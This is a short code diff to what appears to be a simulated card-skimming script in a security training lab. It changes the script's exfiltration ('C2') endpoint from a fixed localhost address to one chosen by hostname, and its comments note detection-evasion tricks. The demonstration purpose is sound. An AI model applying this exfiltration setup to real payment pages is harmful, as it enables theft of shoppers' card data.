@@ -250,8 +250,17 @@
   // Attackers add a slight delay to avoid detection during page load
   setTimeout(function () {
     // Configuration - would be obfuscated in real attacks
+    // Dynamically determine C2 URL based on environment
+    const hostname = window.location.hostname
+    let exfilUrl = 'http://localhost:3000/collect' // Local development default
+
+    // Production and staging - use relative URL since C2 is proxied by nginx
+    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+      exfilUrl = window.location.origin + '/collect'
+    }
+
     const CONFIG = {
-      exfilUrl: 'http://localhost:9002/collect',
+      exfilUrl: exfilUrl,
       delay: 100,
       debug: true // Attackers would set to false
     }
